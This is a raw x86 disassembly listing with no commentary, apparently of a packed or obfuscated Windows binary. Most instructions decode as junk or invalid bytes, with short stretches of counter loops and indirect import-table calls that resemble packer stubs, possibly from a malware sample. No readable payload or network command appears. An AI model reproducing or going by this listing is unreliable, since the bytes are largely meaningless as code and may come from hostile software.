  40a270:	xor    dl,BYTE PTR [esi-0x636bd01c]
  40a276:	out    dx,eax
  40a277:	mov    edi,0x3cd6052d
  40a27c:	jg     0x40a2c4
  40a27e:	pop    esi
  40a27f:	lahf   
  40a280:	call   0xdc28:0xb9e4c61c
  40a287:	fs retf 0xde28
  40a28b:	out    0x5,eax
  40a28d:	jmp    0xcb52ba8a
  40a292:	shr    DWORD PTR [edx],0x8a
  40a295:	out    0xf1,eax
  40a297:	push   0xb0742d23
  40a29c:	jg     0x40a237
  40a29e:	cmp    ecx,DWORD PTR [ecx]
  40a2a0:	mov    bh,0x7
  40a2a2:	and    eax,0xaf2a3dc6
  40a2a7:	js     0x40a244
  40a2a9:	jb     0x40a2bc
  40a2ab:	retf   
  40a2ac:	data16 (bad) 
  40a2ae:	in     al,0x82
  40a2b0:	mov    bh,bh
  40a2b2:	pop    ds
  40a2b3:	or     BYTE PTR [edx-0x556e16a1],al
  40a2b9:	mov    eax,ds:0x13547ede
  40a2be:	jg     0x40a249
  40a2c0:	and    DWORD PTR [esi+0x3d],ebx
  40a2c3:	nop
  40a2c4:	(bad)  
  40a2c5:	retf   
  40a2c6:	fst    st(3)
  40a2c8:	lock stos BYTE PTR es:[edi],al
  40a2ca:	cmp    ah,ch
  40a2cc:	inc    eax
  40a2cd:	push   ss
  40a2ce:	jmp    0x40a265
  40a2d0:	jmp    0x40a2e6
  40a2d2:	pusha  
  40a2d3:	xor    eax,0x8bddbf6d
  40a2d8:	(bad)
  40a2db:	add    BYTE PTR ds:0xcac49d0b,0xcc
  40a2e2:	test   BYTE PTR [ecx+0x2b5c0ec9],dl
  40a2e8:	call   0xe39e:0x984f3c58
  40a2ef:	fstp   QWORD PTR [ebx]
  40a2f1:	jo     0x40a330
  40a2f3:	inc    edx
  40a2f4:	pop    edi
  40a2f5:	add    eax,0x312635b9
  40a2fa:	adc    al,0x8c
  40a2fc:	jb     0x40a377
  40a2fe:	sbb    al,0xd2
  40a300:	pop    eax
  40a301:	fwait
  40a302:	mov    dl,BYTE PTR [ebx-0x1042942c]
  40a308:	call   0x683b:0x9c0f2cb1
  40a30f:	sbb    BYTE PTR [eax+0x5a63324f],ah
  40a315:	xchg   ebp,eax
  40a316:	sbb    al,0xd7
  40a318:	fst    QWORD PTR [edi+ebx*4]
  40a31b:	addr16 enter 0x2c82,0x25
  40a320:	push   edx
  40a321:	dec    esi
  40a322:	(bad)  
  40a323:	jo     0x40a361
  40a325:	add    DWORD PTR [ebx+esi*1+0x54],esp
  40a329:	clc    
  40a32a:	fisub  DWORD PTR [esi]
  40a32c:	fs jne 0x40a391
  40a32f:	xchg   ebp,edx
  40a331:	enter  0x76ad,0xf9
  40a335:	call   0xce93:0x758709bb
  40a33c:	or     ah,BYTE PTR [ebx-0x503b81c2]
  40a342:	jae    0x40a307
  40a344:	or     al,0x25
  40a346:	xor    ebp,DWORD PTR [ebx+0x33bc6233]
  40a34c:	mov    esi,0x3421d72d
  40a351:	mov    dl,0x1b
  40a353:	xchg   edx,eax
  40a354:	retf   0x86d1
  40a357:	pop    ss
  40a358:	mov    BYTE PTR [ecx-0x40],dh
  40a35b:	add    eax,0x846a176c
  40a360:	jge    0x40a3b6
  40a362:	or     bl,BYTE PTR [ecx+0x6d86e640]
  40a368:	(bad)  
  40a369:	into   
  40a36a:	inc    ebp
  40a36b:	popa   
  40a36c:	stc    
  40a36d:	xchg   esi,eax
  40a36e:	dec    edi
  40a36f:	mov    dh,BYTE PTR ds:0x1ff1652b
  40a375:	mov    WORD PTR es:[ebp-0x28076c06],?
  40a37c:	int3   
  40a37d:	cwde   
  40a37e:	xor    BYTE PTR [ebp+0x30c21fde],al
  40a384:	not    DWORD PTR [ebx-0x3e]
  40a387:	in     al,dx
  40a388:	xor    al,0x34
  40a38a:	clc    
  40a38b:	mov    DWORD PTR [esi-0x39],esi
  40a38e:	sub    eax,0x87bbe0b9
  40a393:	pop    edx
  40a394:	into   
  40a395:	gs dec ebp
  40a397:	inc    esp
  40a398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a399:	fsubr  st,st(6)
  40a39b:	add    eax,0x6f13a961
  40a3a0:	adc    ch,dl
  40a3a2:	jp     0x40a339
  40a3a4:	mov    edx,0x1cafd182
  40a3a9:	sub    edx,eax
  40a3ab:	(bad)  
  40a3ac:	popa   
  40a3ad:	dec    eax
  40a3ae:	push   edx
  40a3af:	ja     0x40a40f
  40a3b1:	loopne 0x40a33b
  40a3b3:	mov    al,BYTE PTR [eax+0x69c9d2b7]
  40a3b9:	das    
  40a3ba:	pop    esi
  40a3bb:	add    BYTE PTR ds:[ecx+eiz*4],0x79
  40a3c0:	js     0x40a3c8
  40a3c2:	mov    ds:0xaa05047a,al
  40a3c7:	push   esp
  40a3c8:	sar    BYTE PTR [edi],0xa8
  40a3cb:	mov    esi,0x398f6a84
  40a3d0:	shrd   DWORD PTR [esp+ebp*1],eax,cl
  40a3d4:	cli    
  40a3d5:	dec    edx
  40a3d6:	retf   0x34a4
  40a3d9:	icebp  
  40a3da:	ins    DWORD PTR es:[edi],dx
  40a3db:	add    eax,eax
  40a3dd:	xor    eax,0x331df484
  40a3e2:	sbb    DWORD PTR [ebx-0x2e],edx
  40a3e5:	sbb    ebx,DWORD PTR [ebp-0x12]
  40a3e8:	std    
  40a3e9:	push   esp
  40a3ea:	ret    0x9f17
  40a3ed:	(bad)  
  40a3ee:	scas   al,BYTE PTR es:[edi]
  40a3ef:	std    
  40a3f0:	inc    BYTE PTR [edi]
  40a3f2:	mov    edx,0xca4e4bc4
  40a3f7:	retf   
  40a3f8:	or     bh,al
  40a3fa:	inc    ebp
  40a3fb:	aam    0x3b
  40a3fd:	test   DWORD PTR [eax+edi*8+0x3ad045c7],ebx
  40a404:	test   DWORD PTR [eax+edi*8+0x45c7ff0b],ebx
  40a40b:	int3   
  40a40c:	cmp    eax,0x1bf89c85
  40a411:	cmp    eax,0x434507
  40a416:	mov    DWORD PTR [ebp-0x38],0xf89c853c
  40a41d:	mov    DWORD PTR ds:0x434473,0x13
  40a427:	cmp    DWORD PTR ds:0x434473,0x0
  40a42e:	je     0x40a4bc
  40a434:	cmp    DWORD PTR ds:0x434473,0x21
  40a43b:	jne    0x40a44c
  40a441:	push   0x43458f
  40a446:	call   DWORD PTR ds:0x413338
  40a44c:	xor    edi,edi
  40a44e:	xor    edi,DWORD PTR ds:0x434473
  40a454:	dec    edi
  40a455:	mov    DWORD PTR ds:0x434473,edi
  40a45b:	jmp    0x40a427
  40a460:	and    DWORD PTR ds:0x43457b,0x0
  40a46a:	mov    edx,DWORD PTR ds:0x43457b
  40a470:	inc    edx
  40a471:	mov    DWORD PTR ds:0x43457b,edx
  40a477:	cmp    DWORD PTR ds:0x43457b,0x21
  40a47e:	jne    0x40a4a9
  40a484:	push   0x18fd
  40a489:	push   0x7257
  40a48e:	push   DWORD PTR [ebp-0xc]
  40a491:	push   0x434537
  40a496:	push   0x5f6e
  40a49b:	push   DWORD PTR [ebp-0xc]
  40a49e:	push   0x434827
  40a4a3:	call   DWORD PTR ds:0x41333c
  40a4a9:	cmp    DWORD PTR ds:0x43457b,0x15
  40a4b0:	jb     0x40a46a
  40a4b6:	or     DWORD PTR ds:0x4344cb,ebx
  40a4bc:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40a4c3:	sbb    edi,0x2ba6
  40a4c9:	mov    edx,DWORD PTR [ebp+0x8]
  40a4cc:	xor    edx,eax
  40a4ce:	sub    DWORD PTR ds:0x434513,ecx
  40a4d4:	mov    edi,DWORD PTR [ebp-0x10]
  40a4d7:	or     DWORD PTR ds:0x4344d3,0x4344cf
  40a4e1:	add    edx,ecx
  40a4e3:	cmp    edi,edx
  40a4e5:	je     0x40e6c9
  40a4eb:	mov    DWORD PTR ds:0x4344f7,0x7850
  40a4f5:	push   ebx
  40a4f6:	jmp    0x40de76
  40a4fb:	xor    DWORD PTR ds:0x4344f7,0x535d
  40a505:	mov    edx,DWORD PTR [ebp-0x8]
  40a508:	add    DWORD PTR ds:0x434583,edx
  40a50e:	mov    edi,DWORD PTR [ebp-0x10]
  40a511:	add    DWORD PTR ds:0x43454b,0x4344fb
  40a51b:	sub    edi,edx
  40a51d:	mov    DWORD PTR ds:0x4344cf,0x500e
  40a527:	mov    edx,DWORD PTR [ebp-0x4]
  40a52a:	and    DWORD PTR ds:0x4344cf,0x1370
  40a534:	xor    edx,eax
  40a536:	add    DWORD PTR ds:0x434473,0x35ec
  40a540:	add    edx,ecx
  40a542:	mov    DWORD PTR ds:0x43447b,0xac0
  40a54c:	cmp    edi,edx
  40a54e:	mov    DWORD PTR ds:0x43457b,0x5818
  40a558:	jb     0x40e2b1
  40a55e:	mov    ebx,DWORD PTR ds:0x434597
  40a564:	mov    edx,DWORD PTR ds:0x4345a7
  40a56a:	sub    ebx,edx
  40a56c:	xor    ebx,DWORD PTR [ebx+edx*1]
  40a56f:	mov    edx,DWORD PTR [ebp-0x28]
  40a572:	mov    edi,DWORD PTR [ebp-0x4]
  40a575:	and    DWORD PTR ds:0x4344bf,0x0
  40a57f:	mov    ebx,DWORD PTR ds:0x4344bf
  40a585:	inc    ebx
  40a586:	mov    DWORD PTR ds:0x4344bf,ebx
  40a58c:	cmp    DWORD PTR ds:0x4344bf,0x9
  40a593:	jne    0x40a5a2
  40a599:	push   DWORD PTR [ebp-0x20]
  40a59c:	call   DWORD PTR ds:0x413340
  40a5a2:	cmp    DWORD PTR ds:0x4344bf,0x8
  40a5a9:	jne    0x40a5bc
  40a5af:	mov    ebx,DWORD PTR ds:0x4344bf
  40a5b5:	inc    ebx
  40a5b6:	mov    DWORD PTR ds:0x4344bf,ebx
  40a5bc:	cmp    DWORD PTR ds:0x4344bf,0x1c
  40a5c3:	jb     0x40a57f
  40a5c9:	xor    edx,eax
  40a5cb:	inc    ebx
  40a5cc:	xor    edi,eax
  40a5ce:	sbb    ebx,DWORD PTR ds:0x4344ff
  40a5d4:	add    edi,ecx
  40a5d6:	or     DWORD PTR ds:0x4344b7,ecx
  40a5dc:	add    edx,ecx
  40a5de:	imul   edx,edi
  40a5e1:	mov    edi,DWORD PTR [ebp-0x8]
  40a5e4:	mov    DWORD PTR ds:0x4344cb,0x1b
  40a5ee:	cmp    DWORD PTR ds:0x4344cb,0x0
  40a5f5:	je     0x40a629
  40a5fb:	cmp    DWORD PTR ds:0x4344cb,0x1d
  40a602:	jne    0x40a611
  40a608:	push   DWORD PTR [ebp-0x10]
  40a60b:	call   DWORD PTR ds:0x413404
  40a611:	mov    ebx,DWORD PTR ds:0x4344cb
  40a617:	dec    ebx
  40a618:	mov    DWORD PTR ds:0x4344cb,ebx
  40a61e:	jmp    0x40a5ee
  40a623:	and    DWORD PTR ds:0x434547,ecx
  40a629:	mov    ebx,DWORD PTR [ebp-0x10]
  40a62c:	sub    ebx,edi
  40a62e:	cmp    ebx,edx
  40a630:	mov    DWORD PTR ds:0x4344bf,0x5ce6
  40a63a:	ja     0x40aa85
  40a640:	xor    edx,edx
  40a642:	add    edx,DWORD PTR ds:0x43453f
  40a648:	add    DWORD PTR ds:0x434593,edx
  40a64e:	mov    edx,DWORD PTR [ebp-0x4]
  40a651:	or     DWORD PTR ds:0x4344ff,0x434587
  40a65b:	jmp    0x40aa72
  40a660:	xchg   edx,eax
  40a661:	dec    ebx
  40a662:	in     al,0xe
  40a664:	in     eax,dx
  40a665:	test   eax,0x2c38537c
  40a66a:	out    0x8f,eax
  40a66c:	jae    0x40a6a7
  40a66e:	and    DWORD PTR [edx+0x7e7ef2fa],esp
  40a674:	jo     0x40a6ef
  40a676:	jle    0x40a6f6
  40a678:	(bad)  
  40a679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a67a:	enter  0x567,0x1d
  40a67e:	and    eax,0xb8f87120
  40a683:	call   0x83e3f9ed
  40a688:	loopne 0x40a6fa
  40a68a:	rcr    BYTE PTR [edi+ecx*8-0x2d9926d8],cl
  40a691:	sub    edi,DWORD PTR [ebx]
  40a693:	push   DWORD PTR [esi]
  40a695:	mov    esi,0x8a05927f
  40a69a:	aam    0x3
  40a69c:	adc    eax,ecx
  40a69e:	pop    ecx
  40a69f:	sar    al,cl
  40a6a1:	inc    eax
  40a6a2:	add    bl,ch
  40a6a4:	dec    ebp
  40a6a5:	je     0x40a71b
  40a6a7:	imul   edx,DWORD PTR [ecx+0x45e5e784],0xfffffff5
  40a6ae:	fcmovnu st,st(5)
  40a6b0:	mov    al,0x99
  40a6b2:	push   esi
  40a6b3:	repz pop es
  40a6b5:	cmp    ecx,DWORD PTR [esi]
  40a6b7:	cmp    BYTE PTR [ebx+edx*1+0x17],0xe5
  40a6bc:	and    DWORD PTR [edi+ecx*8],eax
  40a6bf:	or     ebx,DWORD PTR [ebp+0x233f2a5f]
  40a6c5:	adc    BYTE PTR [ebx],dh
  40a6c7:	adc    BYTE PTR [edi],bh
  40a6c9:	mov    ah,0xf5
  40a6cb:	aad    0x5f
  40a6cd:	xchg   edi,ebp
  40a6cf:	call   0x4231373f
  40a6d4:	add    edx,DWORD PTR [ecx+0x37]
  40a6d7:	into   
  40a6d8:	(bad)  
  40a6d9:	and    dl,dl
  40a6db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6dc:	push   es
  40a6dd:	pusha  
  40a6de:	cmp    esp,DWORD PTR [ebx-0x40]
  40a6e1:	adc    ebx,ecx
  40a6e3:	dec    ebp
  40a6e4:	push   ss
  40a6e5:	dec    edi
  40a6e6:	in     eax,dx
  40a6e7:	repnz mov ch,0x3f
  40a6ea:	iret   
  40a6eb:	adc    bh,BYTE PTR [ebx+0x41c8b7db]
  40a6f1:	mov    esp,DWORD PTR [ebx]
  40a6f3:	mov    WORD PTR [edi-0x3fb515b5],?
  40a6f9:	cmp    al,0xd9
  40a6fb:	loopne 0x40a6b9
  40a6fd:	test   al,0x44
  40a6ff:	loop   0x40a6a6
  40a701:	(bad)
  40a705:	fcom   QWORD PTR [ebp-0x64]
  40a708:	ret    0x9f6b
  40a70b:	out    dx,al
  40a70c:	mov    al,ds:0x76859efe
  40a711:	cdq    
  40a712:	sbb    eax,0x1f66f3ac
  40a717:	in     eax,0x6a
  40a719:	sub    ecx,DWORD PTR [eax]
  40a71b:	idiv   DWORD PTR [ebx+0x35]
  40a71e:	sbb    eax,0xf24ae3df
  40a723:	fcmovnbe st,st(6)
  40a725:	mov    cl,0x5f
  40a727:	out    dx,al
  40a728:	mov    al,BYTE PTR [eax+0x5c]
  40a72b:	loop   0x40a783
  40a72d:	adc    al,0x9
  40a72f:	inc    ebp
  40a730:	cs pop eax
  40a732:	ds imul eax,ebx,0xc5d6aac9
  40a739:	iret   
  40a73a:	adc    DWORD PTR [ecx+0xe71b750],0x63
  40a741:	sbb    eax,ebx
  40a743:	dec    esi
  40a744:	ins    BYTE PTR es:[edi],dx
  40a745:	mov    esp,0x2d25717c
  40a74a:	and    DWORD PTR [edx+0x49c28079],ecx
  40a750:	add    cl,BYTE PTR [edx]
  40a752:	pop    ebp
  40a753:	add    BYTE PTR [esi-0x51242f20],cl
  40a759:	xchg   DWORD PTR [ebx-0x72aa8432],ebp
  40a75f:	cmp    al,0x4
  40a761:	jo     0x40a729
  40a763:	sub    BYTE PTR [ebx+0x5c],al
  40a766:	pop    ebp
  40a767:	in     eax,0x94
  40a769:	xchg   dh,bh
  40a76b:	pop    ebx
  40a76c:	call   0x7b6d:0x1251cca2
  40a773:	and    edx,DWORD PTR ss:[edx+0x42555806]
  40a77a:	enter  0x51f6,0x62
  40a77e:	or     al,0x2a
  40a780:	mov    BYTE PTR [ebx+0x2c],ch
  40a783:	pop    edi
  40a784:	or     bh,BYTE PTR [edx-0x75]
  40a787:	into   
  40a788:	xor    BYTE PTR [ebp-0x7],0xdf
  40a78c:	repz inc ebx
  40a78e:	(bad)  
  40a78f:	push   ds
  40a790:	add    DWORD PTR [ebx+0x1e],esp
  40a793:	fcom   QWORD PTR [eax+0x2c]
  40a796:	test   al,0xed
  40a798:	hlt    
  40a799:	out    0x3b,al
  40a79b:	in     eax,0xa6
  40a79d:	sub    ebp,DWORD PTR [eax+0x7c2e3a80]
  40a7a3:	mov    al,ds:0xb78ab7b4
  40a7a8:	imul   ecx,DWORD PTR [ebp+edx*1+0x21],0xffffff9e
  40a7ad:	or     eax,edx
  40a7af:	data16 out 0x5d,al
  40a7b2:	popa   
  40a7b3:	test   al,0xdf
  40a7b5:	lds    edx,FWORD PTR [eax]
  40a7b7:	cs sahf 
  40a7b9:	ret    0x16cb
  40a7bc:	(bad)  
  40a7bd:	mov    bh,0xc2
  40a7bf:	shl    DWORD PTR [esi+0x65557495],0xcc
  40a7c6:	or     bl,0x29
  40a7c9:	ret    
  40a7ca:	ret    
  40a7cb:	dec    eax
  40a7cc:	add    cl,BYTE PTR [ebx-0x3f6649a5]
  40a7d2:	sub    ch,BYTE PTR [ebx-0x5d]
  40a7d5:	rcr    DWORD PTR [eax-0x362dd2ae],1
  40a7db:	jno    0x40a794
  40a7dd:	leave  
  40a7de:	outs   dx,BYTE PTR ds:[esi]
  40a7df:	sti    
  40a7e0:	imul   ebx,DWORD PTR [ebp-0x80],0xffffffcf
  40a7e4:	jnp    0x40a81b
  40a7e6:	inc    esp
  40a7e7:	sub    ebx,DWORD PTR [edi]
  40a7e9:	sti    
  40a7ea:	xor    BYTE PTR [ebp+0x2f],bl
  40a7ed:	cld    
  40a7ee:	int3   
  40a7ef:	sub    al,0xcd
  40a7f1:	push   esi
  40a7f2:	shr    BYTE PTR [esi-0xb],cl
  40a7f5:	outs   dx,BYTE PTR ds:[esi]
  40a7f6:	ret    0x7a53
  40a7f9:	loopne 0x40a821
  40a7fb:	sub    BYTE PTR [edx+0x518c4fd5],0xd0
  40a802:	ja     0x40a7ad
  40a804:	loopne 0x40a7a3
  40a806:	jo     0x40a860
  40a808:	popf   
  40a809:	or     bh,BYTE PTR [edi+esi*1+0x10]
  40a80d:	sbb    eax,0x4f44b157
  40a812:	sbb    DWORD PTR ds:0xcdfc9582,esi
  40a818:	js     0x40a7c9
  40a81a:	sti    
  40a81b:	and    BYTE PTR [ecx],0x5d
  40a81e:	sahf   
  40a81f:	mov    esi,DWORD PTR [edx]
  40a821:	mov    esp,0x3089ab53
  40a826:	ficomp WORD PTR [ebx+0x57]
  40a829:	outs   dx,BYTE PTR ds:[esi]
  40a82a:	xor    edi,eax
  40a82c:	jge    0x40a887
  40a82e:	jns    0x40a86c
  40a830:	pop    edx
  40a831:	aam    0xb9
  40a833:	data16 into 
  40a835:	and    BYTE PTR [ebp*4-0x79c06529],al
  40a83c:	adc    esi,eax
  40a83e:	push   ds
  40a83f:	mov    esi,0x82118166
  40a844:	call   0x91dd6107
  40a849:	and    bl,BYTE PTR [esi+0x4c]
  40a84c:	mov    al,ds:0x153b7ec8
  40a851:	jo     0x40a8c7
  40a853:	lds    edi,FWORD PTR [esi-0x654eae91]
  40a859:	fcom   QWORD PTR [ebx+ecx*8+0x4c95be40]
  40a860:	jp     0x40a870
  40a862:	pop    eax
  40a863:	sbb    DWORD PTR [esi+0x76],0x90d13516
  40a86a:	adc    BYTE PTR [esp+ecx*8-0x1d],al
  40a86e:	aad    0x44
  40a870:	popf   
  40a871:	mov    ds:0xe6ec68a1,al
  40a876:	leave  
  40a877:	pop    ebp
  40a878:	stc    
  40a879:	adc    BYTE PTR fs:[esi-0x4ba059d4],bl
  40a880:	jge    0x40a84a
  40a882:	aas    
  40a883:	mov    dh,0x30
  40a885:	mov    cl,0x8e
  40a887:	std    
  40a888:	push   edx
  40a889:	das    
  40a88a:	out    dx,al
  40a88b:	repz xor eax,DWORD PTR [esi]
  40a88e:	adc    DWORD PTR [eax+ebx*8+0x73dd98ec],esp
  40a895:	in     eax,dx
  40a896:	ret    
  40a897:	into   
  40a898:	inc    ebp
  40a899:	inc    eax
  40a89a:	(bad)  
  40a89c:	ja     0x40a85c
  40a89e:	sbb    DWORD PTR [ebx],esi
  40a8a0:	cmp    ebp,DWORD PTR [ebp+0x59]
  40a8a3:	cmp    DWORD PTR [edi-0x3b55df99],0xe02a1f6f
  40a8ad:	int3   
  40a8ae:	sub    ecx,DWORD PTR [eax]
  40a8b0:	push   edx
  40a8b1:	xor    al,0x18
  40a8b3:	sbb    al,0xef
  40a8b5:	mov    cs,WORD PTR [ebp-0x2e]
  40a8b8:	(bad)  
  40a8b9:	xor    edi,DWORD PTR [ebx-0x41]
  40a8bc:	mov    edx,0xe8aea067
  40a8c1:	mov    esp,0x8578a6e6
  40a8c6:	fwait
  40a8c7:	add    edx,DWORD PTR [ebx]
  40a8c9:	or     eax,0x8c99a5cf
  40a8ce:	sbb    edi,ebx
  40a8d0:	push   es
  40a8d1:	or     BYTE PTR [eax-0xa63e18f],al
  40a8d7:	push   ecx
  40a8d8:	pop    esi
  40a8d9:	fdivr  DWORD PTR [ebx-0x53a73a32]
  40a8df:	cdq    
  40a8e0:	adc    DWORD PTR [eax-0x3ebcee62],edx
  40a8e6:	retf   
  40a8e7:	add    DWORD PTR [edi+eax*4-0x23ff66ed],0xffffffca
  40a8ef:	test   ch,dl
  40a8f1:	inc    esp
  40a8f2:	inc    esi
  40a8f3:	mov    ebp,0xc0e9da87
  40a8f8:	xchg   esi,eax
  40a8f9:	add    dl,bh
  40a8fb:	inc    esi
  40a8fc:	dec    ebp
  40a8fd:	sbb    BYTE PTR [ecx+0x1a],bl
  40a900:	out    dx,eax
  40a901:	stc    
  40a902:	xchg   esp,eax
  40a903:	cmp    ah,BYTE PTR [ebp+0x440ec91]
  40a909:	ret    0xf020
  40a90c:	(bad)  
  40a90d:	stos   DWORD PTR es:[edi],eax
  40a90e:	cmp    bh,BYTE PTR [esp+ebp*8+0x15]
  40a912:	inc    esi
  40a913:	(bad)  [ebp+0x236fa438]
  40a919:	sub    edi,DWORD PTR [edi]
  40a91b:	jmp    0x3326:0xabf177c1
  40a922:	add    BYTE PTR [eax],bh
  40a924:	js     0x40a967
  40a926:	and    al,0xcc
  40a928:	fidiv  WORD PTR [esi+ecx*2+0x53]
  40a92c:	xchg   esp,eax
  40a92d:	(bad)
  40a930:	mov    esi,0xbeba2e1d
  40a935:	cmp    eax,DWORD PTR [esp+edi*1+0x27e67901]
  40a93c:	mov    esp,0xaaed9dda
  40a941:	and    ebp,esi
  40a943:	jp     0x40a9b3
  40a945:	ret    
  40a946:	or     al,0x6a
  40a948:	sub    DWORD PTR [esi],edx
  40a94a:	adc    ah,BYTE PTR [edi+0x26]
  40a94d:	jbe    0x40a995
  40a94f:	xchg   esp,eax
  40a950:	arpl   WORD PTR [ecx],si
  40a952:	adc    DWORD PTR [ecx],ecx
  40a954:	xor    ebx,esp
  40a956:	das    
  40a957:	and    edi,DWORD PTR [esi]
  40a959:	outs   dx,DWORD PTR ds:[esi]
  40a95a:	call   0x817666e
  40a95f:	adc    BYTE PTR [edx+ecx*4+0x17251f99],dh
  40a966:	sti    
  40a967:	mov    WORD PTR [esi],fs
  40a969:	xor    bl,ah
  40a96b:	inc    ecx
  40a96c:	push   edx
  40a96d:	mov    bh,0x16
  40a96f:	popf   
  40a970:	push   cs
  40a971:	pop    esi
  40a972:	mov    ebx,0x2bcb2c3a
  40a977:	call   0x91c39797
  40a97c:	push   cs
  40a97d:	shl    dl,1
  40a97f:	jbe    0x40a97e
  40a981:	push   ecx
  40a982:	xor    ecx,edx
  40a984:	pop    eax
  40a985:	xor    eax,0x9b4137f6
  40a98a:	push   ecx
  40a98b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a98c:	dec    ebx
  40a98d:	pop    esp
  40a98e:	mov    al,ds:0x1293ddbc
  40a993:	loope  0x40a93f
  40a995:	cli    
  40a996:	mov    dh,0xd0
  40a998:	cmp    eax,0xa344c0c5
  40a99d:	mov    edx,0x20dc2144
  40a9a2:	das    
  40a9a3:	jl     0x40a935
  40a9a5:	scas   al,BYTE PTR es:[edi]
  40a9a6:	pop    edx
  40a9a7:	(bad)  
  40a9a8:	out    dx,al
  40a9a9:	mov    ebx,0xd1bc0ac8
  40a9ae:	cld    
  40a9af:	or     eax,0xbad6edd3
  40a9b4:	ds jnp 0x40aa02
  40a9b7:	leave  
  40a9b8:	cmp    BYTE PTR cs:[ebx+0x11e2259e],dl
  40a9bf:	xlat   BYTE PTR ds:[ebx]
  40a9c0:	imul   BYTE PTR [edx+0x54]
  40a9c3:	out    dx,eax
  40a9c4:	loop   0x40a985
  40a9c6:	mov    esp,0x8d49cadc
  40a9cb:	gs (bad) 
  40a9cd:	test   bh,cl
  40a9cf:	(bad)  
  40a9d0:	xchg   BYTE PTR [esi],ch
  40a9d2:	push   ecx
  40a9d3:	out    0xb9,eax
  40a9d5:	sbb    BYTE PTR [ecx-0x63a6d92],0xb1
  40a9dc:	xlat   BYTE PTR ds:[ebx]
  40a9dd:	mov    cl,0x75
  40a9df:	int    0xc1
  40a9e1:	mov    cl,0x91
  40a9e3:	mov    cl,al
  40a9e5:	cmp    bl,al
  40a9e7:	bound  edx,QWORD PTR [eax+0x9]
  40a9ea:	sub    ah,BYTE PTR [ebp+0x19]
  40a9ed:	cmp    DWORD PTR [edx],edx
  40a9ef:	inc    esi
  40a9f0:	sbb    BYTE PTR [ebp+0x33713cd0],0x4
  40a9f7:	jno    0x40a9b6
  40a9f9:	and    eax,0x6c28efdd
  40a9fe:	mov    ebp,DWORD PTR [esi-0x391766a2]
  40aa04:	push   ds
  40aa05:	fdivr  QWORD PTR [esi+0x3b]
  40aa08:	add    dl,dh
  40aa0a:	mov    al,0xa2
  40aa0c:	push   ebx
  40aa0d:	mov    BYTE PTR [edi],bl
  40aa0f:	and    BYTE PTR [edx+edx*4-0x71],bl
  40aa13:	pop    esp
  40aa14:	sbb    ch,bh
  40aa16:	loop   0x40aa2f
  40aa18:	in     eax,0x9d
  40aa1a:	ret    
  40aa1b:	mov    ds:0x2644be3b,eax
  40aa20:	add    dh,BYTE PTR [edi-0xa2e537c]
  40aa26:	inc    edi
  40aa27:	js     0x40aa03
  40aa29:	lea    esp,[esi]
  40aa2b:	cs dec ebp
  40aa2d:	push   ds
  40aa2e:	mov    bh,0x7f
  40aa30:	test   BYTE PTR [ecx],cl
  40aa32:	xor    bh,BYTE PTR [esi+0x73]
  40aa35:	cs mov ch,0x93
  40aa38:	ja     0x40aa18
  40aa3a:	shl    BYTE PTR [ebx-0x25],cl
  40aa3d:	call   0x967a:0x152b1bb2
  40aa44:	dec    esi
  40aa45:	jp     0x40aa14
  40aa47:	pop    esp
  40aa48:	scas   eax,DWORD PTR es:[edi]
  40aa49:	inc    esp
  40aa4a:	mov    ah,0xb3
  40aa4c:	std    
  40aa4d:	add    ebp,0x2e7804c6
  40aa53:	dec    esp
  40aa54:	lods   al,BYTE PTR ds:[esi]
  40aa56:	out    dx,eax
  40aa57:	inc    edi
  40aa58:	inc    edi
  40aa59:	and    eax,edi
  40aa5b:	aad    0xda
  40aa5d:	push   es
  40aa5e:	fs and esi,esp
  40aa61:	jge    0x40aac4
  40aa63:	int3   
  40aa64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa65:	out    dx,eax
  40aa66:	div    BYTE PTR [ecx]
  40aa68:	imul   ebp,ebx,0xffffffc2
  40aa6b:	div    DWORD PTR [edx+0x5b9b3d00]
  40aa71:	xor    dh,BYTE PTR [ebx]
  40aa73:	rol    BYTE PTR [ecx+0x4344d315],1
  40aa79:	add    bh,bh
  40aa7b:	inc    esp
  40aa7c:	inc    ebx
  40aa7d:	add    BYTE PTR [ebx],al
  40aa7f:	shr    ecx,1
  40aa81:	jno    0x40aa9d
  40aa83:	add    BYTE PTR [eax],al
  40aa85:	mov    edx,DWORD PTR [ebp-0x2c]
  40aa88:	sub    DWORD PTR ds:0x434473,0x7416
  40aa92:	mov    edi,DWORD PTR [ebp-0x4]
  40aa95:	mov    ebx,DWORD PTR ds:0x43457b
  40aa9b:	sub    ebx,DWORD PTR ds:0x43458b
  40aaa1:	mov    DWORD PTR ds:0x43457b,ebx
  40aaa7:	xor    edx,eax
  40aaa9:	xor    edi,eax
  40aaab:	or     ebx,0x1288
  40aab1:	add    edi,ecx
  40aab3:	adc    ebx,DWORD PTR ds:0x43453b
  40aab9:	jmp    0x40aed0
  40aabe:	test   DWORD PTR [eax-0x4c324c3f],edi
  40aac4:	jne    0x40ab36
  40aac6:	xchg   ebx,eax
  40aac7:	in     eax,0x4e
  40aac9:	in     eax,dx
  40aaca:	push   es
  40aacb:	pop    edx
  40aacc:	jl     0x40aadf
  40aace:	cld    
  40aacf:	(bad)  
  40aad0:	jle    0x40ab50
  40aad2:	jo     0x40ab4d
  40aad4:	jle    0x40ab54
  40aad6:	int3   
  40aad7:	out    dx,al
  40aad8:	inc    esi
  40aad9:	xor    eax,0xd69ba58d
  40aade:	mov    esi,0xf57f2db0
  40aae3:	dec    ecx
  40aae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aae5:	rol    DWORD PTR ds:0x3ceea351,cl
  40aaeb:	pop    esp
  40aaec:	fldcw  WORD PTR [esi+0x6e885ed7]
  40aaf2:	cmp    DWORD PTR [ecx],ebp
  40aaf4:	mov    bl,0x81
  40aaf6:	xchg   ecx,eax
  40aaf7:	ds pop ss
  40aaf9:	mov    ds:0x5e817c06,al
  40aafe:	add    DWORD PTR [edx],edx
  40ab00:	ss jl  0x40ab14
  40ab03:	sub    bh,BYTE PTR [edx]
  40ab05:	add    bl,0x5e
  40ab08:	or     DWORD PTR [eax+0x5b],edx
  40ab0b:	xlat   BYTE PTR ds:[ebx]
  40ab0c:	mov    dl,0xb0
  40ab0e:	dec    esp
  40ab0f:	jl     0x40aaab
